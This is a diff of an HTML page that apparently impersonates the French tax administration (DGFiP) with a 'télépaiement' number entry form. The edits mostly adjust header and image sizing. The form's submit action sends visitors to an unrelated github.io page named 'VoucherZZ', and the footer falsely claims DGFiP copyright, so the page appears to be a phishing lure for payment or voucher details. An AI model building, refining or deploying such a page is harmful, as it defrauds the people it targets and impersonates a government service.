@@ -13,7 +13,7 @@
         }
         .header {
             width: 100%;
-            height: 50vh;
+            height: 60vh; /* Increased height for the header */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,6 +23,8 @@
             max-width: 100%;
             max-height: 100%;
             object-fit: contain;
+            width: auto; /* Ensure the image scales correctly */
+            height: auto; /* Ensure the image scales correctly */
         }
         .content {
             padding: 20px;
@@ -63,7 +65,7 @@
                 height: auto;
             }
             .header img {
-                max-height: 30vh;
+                max-height: 40vh; /* Increased height for smaller screens */
             }
             .button-zone button {
                 padding: 12px 30px;
@@ -75,16 +77,18 @@
     <div class="header">
         <a href="https://ibb.co/Q3BNnVhd"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" border="0" /></a>
     </div>
-
     <div class="content">
-        <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" border="0" /></a></center>
-
-        <center><div class="form-container">
+        <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" border="0" style="max-width: 100%; height: auto;" /></a></center>
+       <div class="form-container">
             
         <center><h3>Saisie du numéro de télépaiement</h3>
+         
+       
             <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
-                <div class="input-group">
+                
+              <div class="input-group">
                     <label for="numeroTelepaiement">Numéro de télépaiement :</label>
+                  
                     <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
                 </div>
                 <div class="input-group">
@@ -97,7 +101,6 @@
             </form>
         </div>
     </div>
-
     <div class="footer-copyright">
         <p>© Direction générale des Finances publiques - <a id="mention-legales" class="xt" href="/tai/mention-legales">Mentions légales</a></p>
     </div>
